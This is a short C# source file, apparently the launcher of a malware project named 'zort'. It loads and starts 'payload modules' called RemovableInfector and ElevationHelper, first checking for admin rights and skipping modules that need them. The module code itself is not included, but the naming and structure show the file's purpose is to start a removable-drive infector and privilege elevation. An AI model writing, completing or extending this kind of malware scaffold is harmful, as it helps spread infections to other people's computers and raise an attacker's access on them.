using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    class Program
    {
        static void Main(string[] args) // Change Main to async Task
        {
            InitModules();
            Console.ReadLine();
        }

        static void InitModules()
        {
            List<IPayloadModule> modules = new List<IPayloadModule>
            {
                new RemovableInfector(),
                new ElevationHelper()
            };

            bool isAdmin = ElevationHelper.IsElevated();
            modules.ForEach(m =>
            {
                if (m.RequiresAdmin && !isAdmin)
                {
                    Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
                    return;
                }
                Console.WriteLine($"Starting module {m.ModuleName}");
                m.Start();
            });
        }
    }
}
